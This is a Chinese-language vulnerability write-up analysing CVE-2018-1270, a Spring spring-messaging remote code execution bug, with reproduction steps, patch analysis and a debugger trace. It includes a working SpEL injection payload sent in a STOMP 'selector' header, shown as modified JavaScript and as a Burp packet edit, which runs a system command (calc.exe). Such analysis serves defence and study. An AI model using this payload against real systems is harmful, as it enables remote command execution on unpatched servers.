#spring-messaging远程代码执行漏洞分析(CVE-2018-1270)
##概述
2018年4月5日，Pivotal Spring官方发布安全公告，Spring框架中存在三个漏洞。其中编号为CVE-2018-1270的漏洞可导致远程代码执行，漏洞存在于spring-message模块。


###影响版本
- Spring Framework 5.0 to 5.0.4.
- Spring Framework 4.3 to 4.3.14


##环境搭建
利用官方示例 https://github.com/spring-guides/gs-messaging-stomp-websocket ，git clone后checkout到未更新版本：

    git clone https://github.com/spring-guides/gs-messaging-stomp-websocket
    
    git checkout 6958af0b02bf05282673826b73cd7a85e84c12d3

打开IDEA进行Maven配置

![](https://i.imgur.com/ht7D5px.png)

直接运行项目，环境搭建成功

![](https://i.imgur.com/06MDIBy.png)


##漏洞复现
Spring框架中通过spring-messaging模块来实现STOMP（Simple Text-Orientated Messaging Protocol），STOMP是一种封装WebSocket的简单消息协议。攻击者可以通过建立WebSocket连接并发送一条消息造成远程代码执行。如果使用了Spring Security项目中的权限认证，可以在一定程度上增加漏洞利用难度。
###1.执行Javascript代码进行复现
示例项目是通过静态资源app.js运行在客户端与服务器做websocket交互，使用connect()函数建立Stomp链接。此方法适合在知道代码如下：

    function connect() {
    	var socket = new SockJS('/gs-guide-websocket');
    	stompClient = Stomp.over(socket);
    	stompClient.connect({}, function (frame) {
    		setConnected(true);
    		console.log('Connected: ' + frame);
    		stompClient.subscribe('/topic/greetings', function (greeting) {
    			showGreeting(JSON.parse(greeting.body).content);
    		});
    	});
    }

Stomp协议规范中通过指定selector对订阅的信息进行过滤。增加一个header头部，添加selector项，value为payload。如下：

    function connect() {
    	var header  = {"selector":"T(java.lang.Runtime).getRuntime().exec('calc.exe')"};
    	var socket = new SockJS('/gs-guide-websocket');
    	stompClient = Stomp.over(socket);
    	stompClient.connect({}, function (frame) {
    		setConnected(true);
    		console.log('Connected: ' + frame);
    		stompClient.subscribe('/topic/greetings', function (greeting) {
    			showGreeting(JSON.parse(greeting.body).content);
    		},header);
    	});
    }

控制台使用上述JS代码，并执行开启连接
![](https://i.imgur.com/MQ9tvL7.png)

随意输入字符串进行发送，成功命令执行

![](https://i.imgur.com/S70EIKT.png)


###2.拦截修改数据包
打开burpsuite进行抓包，点击connect。当捕获到下列数据时
![](https://i.imgur.com/i2hUAsN.png)

增加payload：`\nselector:T(java.lang.Runtime).getRuntime().exec('calc.exe')`
![](https://i.imgur.com/dWdhThM.png)

接着发送数据，成功执行payload
![](https://i.imgur.com/CTaac3C.png)

##补丁分析

地址如下：

https://github.com/spring-projects/spring-framework/commit/e0de9126ed8cf25cf141d3e66420da94e350708a#diff-ca84ec52e20ebb2a3732c6c15f37d37a

删除了StandardEvaluationContext引用，采用了SimpleEvaluationContext。StandardEvaluationContext可以执行任意SpEL表达式，Spring官方在5.0.5之后换用SimpleEvaluationContext，用于实现简单的数据绑定，保持灵活性减少安全隐患
![](https://i.imgur.com/XQEvPrn.png)


##漏洞分析

handleMessageInternal对消息进行处理，registerSubscription注册订阅者,最后调用DefaultSubscriptionRegistry函数对header参数进行处理，对selector值进行了解析，并将其保存至这次会话中。

首先进入org/springframework/messaging/simp/broker/DefaultSubscriptionRegistry.java，找到addSubscriptionInternal下断点进行分析
![](https://i.imgur.com/lamnH8l.png)

执行JS，捕获到message数据

![](https://i.imgur.com/jARmqNY.png)

向下执行，this.getSelectorHeaderName()执行结果为selector
![](https://i.imgur.com/c4GU0P5.png)
从header中获取到注入的表达式，赋值给selector
![](https://i.imgur.com/iNcdB43.png)
对表达式进行了解析
![](https://i.imgur.com/zGbAXn7.png)

接着解析后的表达式传到addSubscription，与此次会话绑定在一起。如图所示，此次连接对应的sessionId为hprhnwtn，subsId为sub-0
![](https://i.imgur.com/qTCUtUi.png)

spring进行了一系列处理后，开始向消息的订阅者分发消息，在org/springframework/messaging/simp/broker/SimpleBrokerMessageHandler的sendMessageToSubscribers函数处下断点。之后在http://localhost:8080/中输入任意字符串，点击send
![](https://i.imgur.com/iT4aGdK.png)
跟进findSubscriptions方法，message保存了此次连接/会话的相关信息
![](https://i.imgur.com/zrMmMRw.png)

message传入findSubscriptionsInternal，继续跟进
![](https://i.imgur.com/Ufn4aIO.png)

执行this.destinationCache.getSubscriptions，返回了一对值。分别对应sessionId和subsId
![](https://i.imgur.com/z2T7seM.png)

进入filterSubscriptions函数，两次getSubscriptions操作，此时取出了先前的配置信息。通过getSelectorExpression，获得表达式
![](https://i.imgur.com/wv8EQT5.png)
执行到expression.getValue(context, Boolean.class)，执行了spel表达式，远程命令执行成功。
![](https://i.imgur.com/RU0NR92.png)


##参考链接

- https://xz.aliyun.com/t/2252
- https://pivotal.io/security/cve-2018-1270